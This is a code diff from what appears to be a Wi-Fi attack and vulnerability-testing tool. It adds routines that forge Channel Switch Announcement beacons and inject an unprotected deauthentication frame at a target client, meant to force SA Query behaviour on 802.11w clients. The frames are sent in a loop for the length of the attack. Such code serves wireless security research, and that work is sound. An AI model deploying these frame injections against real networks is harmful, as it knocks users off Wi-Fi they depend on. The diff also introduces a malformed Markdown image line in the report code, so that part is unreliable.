@@ -7,6 +7,7 @@
 #include <optional>
 #include "system/netlink_guards.h"
 
+#include "attacks/DoS_soft/deauth/deauth.h"
 #include "attacks/components/setup_connections.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "ex_program/hostapd/hostapd_helper.h"
@@ -160,6 +161,32 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, c
 	return radiotap;
 }
 
+vector<RadioTap> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
+	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac) {
+	vector<RadioTap> frames;
+	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
+		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
+	// after switch_count=0: inject unprotected Deauth
+	// to reliably trigger SA Query on ieee80211w=1 clients that only react reactively (not proactively after CSA)
+	frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac));
+	return frames;
+}
+
+void update_time_CSA_frames(vector<RadioTap> &frames) {
+	for(auto &frame : frames) {
+		if(auto *b = frame.find_pdu<Dot11Beacon>())
+			b->timestamp(duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count());
+	}
+}
+
+void send_CSA_frames(PacketSender &sender, vector<RadioTap> &frames) {
+	for(auto &frame : frames) {
+		if(auto *b = frame.find_pdu<Dot11Beacon>())
+			b->timestamp(duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count());
+		sender.send(frame);
+	}
+}
+
 void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
 	const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
 	const int attack_time, const int RSN_scan_timeout_sec , const optional<string> &netns) {
@@ -183,14 +210,9 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 		ap_channel.ch_num,
 		ssid);
 
-	vector<RadioTap> frames;
-	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
-		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
-
-	size_t idx = 0;
+	vector<RadioTap> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac);
 	while(steady_clock::now() < end_time) {
-		sender.send(frames[idx]);
-		if(++idx >= frames.size()) idx = 0;
+		send_CSA_frames(sender, frames);
 		interruptible_sleep(milliseconds(ms_interval));
 	}
 }
@@ -251,8 +273,8 @@ void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>
 
 	const path ATT_graph_path = tshark_graph(rs, "attacker", elements);
 	if(!ATT_graph_path.empty()) {
-		report << "### ATT (att, hostapd-mana " << hostapd::get_version(rs, "attacker") << ")\n";
-		report << "![ATT Graph](" << ATT_graph_path << ")\n\n";
+		report << "### ATT (att)\n";
+		report << "![ATT Grap(" << ATT_graph_path << ")\n\n";
 	}
 
 	const path rogue_graph_path = tshark_graph(rs, "rogue_ap", elements);
